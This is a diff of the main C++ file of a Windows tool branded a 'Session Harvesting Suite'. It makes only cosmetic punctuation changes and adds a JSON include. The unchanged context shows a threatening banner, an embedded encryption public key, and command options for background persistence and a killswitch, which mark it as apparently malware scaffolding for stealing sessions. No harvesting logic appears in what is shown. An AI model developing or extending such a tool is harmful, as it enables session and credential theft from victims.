@@ -1,5 +1,5 @@
 // ============================================================================
-// SIXERC — Enterprise Session Harvesting Suite
+// SIXERC - Enterprise Session Harvesting Suite
 // Codename: "Ekwensu's Grasp"
 // Version: 1.0.0
 // Author: Anonymous-beta (Chinedu)
@@ -24,12 +24,13 @@
 #include <string>
 #include <vector>
 #include <thread>
+#include <nlohmann/json.hpp>
 #include <windows.h>
 
 using namespace sixerc;
 
 // Embedded default RSA public key (replace with your own)
-// This is a placeholder — generate a real keypair for production
+// This is a placeholder - generate a real keypair for production
 static const char* DEFAULT_PUBKEY = R"(-----BEGIN RSA PUBLIC KEY-----
 MIIBCgKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgwMbRvI0MBZhpz/w0l
 nG/H0ZcFvL9G3bP/hg0q8w0l3Q0h0bG9jZXI=
@@ -40,12 +41,12 @@ void print_banner() {
     std::cout << R"(
     ╔══════════════════════════════════════════════════════════════════╗
     ║                                                                  ║
-    ║     SIXERC — Enterprise Session Harvesting Suite                ║
+    ║     SIXERC - Enterprise Session Harvesting Suite                ║
     ║     Codename: "Ekwensu's Grasp"                                 ║
     ║     Version: 1.0.0                                              ║
     ║     Author: Anonymous-beta (Chinedu)                            ║
     ║                                                                  ║
-    ║     Ekwensu doesn't negotiate with the living—he collects       ║
+    ║     Ekwensu doesn't negotiate with the living-he collects       ║
     ║     what's owed.                                                ║
     ║                                                                  ║
     ╚══════════════════════════════════════════════════════════════════╝
@@ -177,7 +178,7 @@ int main(int argc, char* argv[]) {
         } else if (arg == "/config" || arg == "--config") {
             if (i + 1 < argc) config_path = argv[++i];
         } else if (arg == "/help" || arg == "--help" || arg == "/?") {
-            std::cout << "SIXERC v" << SIXERC_VERSION << " — " << SIXERC_CODENAME << std::endl;
+            std::cout << "SIXERC v" << SIXERC_VERSION << " - " << SIXERC_CODENAME << std::endl;
             std::cout << "Usage: SIXERC [options]" << std::endl;
             std::cout << "  /background    Run in background mode (persistence)" << std::endl;
             std::cout << "  /killswitch    Enable killswitch timer" << std::endl;
